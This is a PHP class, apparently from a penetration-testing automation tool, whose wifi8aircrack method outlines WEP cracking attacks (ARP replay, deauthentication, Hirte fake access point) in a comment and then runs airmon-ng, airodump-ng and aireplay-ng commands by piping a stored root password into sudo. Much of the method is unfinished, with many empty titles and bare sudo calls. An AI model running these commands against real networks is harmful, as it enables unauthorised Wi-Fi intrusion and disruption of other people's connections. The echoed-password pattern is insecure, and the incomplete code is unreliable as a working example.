<?php



class com4wifi extends tunnel4linux {
    
    
    public function __construct($stream,$eth,$domain,$ip,$port,$protocol) {
        parent::__construct($stream,$eth,$domain,$ip,$port,$protocol);
    }
    
public  function wifi(){
    
}


public  function wifi8aircrack($stream){
    $this->titre(__FUNCTION__);
    $filter = "";
    $wlan = "wlan0";
    /*

    Attacking Methods
Passive – Silence Mode
    sniffing the air for packets without 
    sending any data to the AP or clients.
 Active ­ 
      breaking the key while sending data to 
      the AP or client.
 
      Attacking Methods
 ARP Replay 

 Caffe­Latte

 Hirte 

 ChopChop / KoRek 

 FMS Attack

 PTW Attack
 
      
    ARP Replay Attack steps
1 - Start capturing first Pockets :
airodump-ng --channel $CH --bssid $BSSID --write dump-to-crack mon0
2 - Starting ARP Reply Attack :
aireplay-ng --arpreplay -b $ESSID -x 100 -h $ORIGINAL-MAC mon0
3 – Start De-Auth Attack(Until you get ARP packets) :
aireplay-ng --deauth 1 -a $BSSID -h $CLIENT-MAC mon0
4 – Start cracking the CAP file.
aircrack-ng dump-to-crack.cap


Hirte Attack(Extends for Caffe-Latte) steps
1 – Find a probe you want to hack and start the Hirte Attack :
airbase-ng -W 1 -c 6 -N --essid $ESSID-TO-HACK mon0
2 – Start saving the packets :
airodump-ng --channel $CH --bssid $BSSID --write dump-to-crack mon0
3 – Start cracking the CAP file
aircrack-ng dump-to-crack.cap
     */
    $this->ssTitre("Display Interface Wifi");
    $data = "echo '$this->root_passwd' | sudo -S airmon-ng";
    $this->req_tab($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("Start Interface");
    $data = "echo '$this->root_passwd' | sudo -S airmon-ng start $wlan";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("Check Starting");
    $data = "echo '$this->root_passwd' | sudo -S airmon-ng check";
    $this->req_tab($stream, $data, $this->stream_timeout, $filter);
    
    
    $this->ssTitre("SSID not hidden");
    $data = "echo '$this->root_passwd' | sudo -S iw dev $wlan scan | egrep \"DS Parameter set|SSID\"";
    $this->req_tab($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S airodump-ng -c 11 --bssid xx:xx:xx:xx:xx:xx -w testdemo mon0";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S aireplay-ng -1 0 -e AP-SSID -a xx:xx:xx:xx:xx:xx -h yy:yy:yy:yy:yy:yy mon0";
    $this->req_tab($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $this->article("ESSID", " Access Point’s Broadcast name. (ie linksys, default, belkin etc) Some AP’s will not broadcast their name,But Airodump-ng can guess it");
    $data = "echo '$this->root_passwd' | sudo -S airodump-­ng mon0";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S ";
    $this->req_tab($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S ";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S ";
    $this->req_tab($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S ";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S ";
    $this->req_tab($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S ";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S ";
    $this->req_tab($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S ";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S ";
    $this->req_tab($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S ";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S ";
    $this->req_tab($stream, $data, $this->stream_timeout, $filter);
    
    $this->ssTitre("");
    $data = "iwconfig";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);





}
  

}
?>